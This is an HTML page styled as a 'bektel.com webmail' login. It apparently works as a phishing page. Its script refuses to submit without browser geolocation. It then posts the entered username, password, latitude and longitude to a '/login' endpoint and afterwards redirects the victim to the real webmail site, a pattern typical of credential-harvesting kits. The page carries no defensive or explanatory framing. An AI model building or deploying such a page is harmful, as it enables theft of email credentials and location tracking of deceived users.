<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #dbe4ec;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .main-container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
        }

        .login-container {
            background-color: #2d2d2d;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 350px;
        }

        .login-container img {
            width: 150px;
            height: auto;
            margin-bottom: 20px;
        }

        .login-container h2 {
            color: #fff;
            margin-bottom: 20px;
        }

        .login-container input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .recaptcha {
            background-color: #050505;
            padding: 10px;
            margin: 15px 0;
            border-radius: 5px;
        }

        .login-container button {
            background-color: #000;
            color: #fff;
            padding: 10px;
            width: 100%;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }

        .login-container button:hover {
            background-color: #444;
        }

        .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #aaa;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="login-container">
            <img src="bektel.com.png" alt="Logo Placeholder">
            <form id="login-form">
                <input type="text" id="username" placeholder="Username" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
        </div>
        <div class="footer">
            bektel.com webmail
        </div>
    </div>

    <script>
        document.getElementById('login-form').addEventListener('submit', async (event) => {
            event.preventDefault();
    
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
    
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const { latitude, longitude } = position.coords;
    
                    try {
                        const response = await fetch('/login', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({ username, password, latitude, longitude }),
                        });
    
                        const result = await response.json();
    
                        if (response.ok) {
                            alert(result.message); // Show success alert
                            window.location.href = 'https://webmail.bektel.com/'; // Redirect after alert
                        } else {
                            alert(`Error: ${result.error}`); // Show error alert
                        }
                    } catch (error) {
                        console.error('Error:', error);
                        alert('An error occurred. Please try again later.');
                    }
                }, (error) => {
                    console.error('Geolocation error:', error);
                    alert('Unable to fetch location. Please enable location services.');
                });
            } else {
                alert('Geolocation is not supported by your browser.');
            }
        });
    </script>
</body>
</html>
